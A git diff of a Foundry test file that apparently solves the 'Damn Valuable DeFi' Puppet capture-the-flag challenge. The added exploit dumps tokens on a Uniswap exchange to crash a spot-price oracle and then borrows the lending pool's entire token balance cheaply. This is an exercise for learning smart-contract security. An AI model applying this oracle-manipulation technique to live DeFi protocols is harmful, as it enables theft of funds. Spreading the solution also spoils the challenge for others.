@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
@@ -100,7 +101,13 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        // approves the uniswap exchange to spend attacker tokens.
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        // swaps 1000 DVT tokens for ETH to reduce demand for DVT
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, DEADLINE);
+        // borrows from the pool
+        puppetPool.borrow{value: 20 ether}(dvt.balanceOf(address(puppetPool)));
         /**
          * EXPLOIT END *
          */
@@ -117,6 +124,7 @@ contract Puppet is Test {
     // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
     function calculateTokenToEthInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
         internal
+        pure
         returns (uint256)
     {
         uint256 input_amount_with_fee = input_amount * 997;
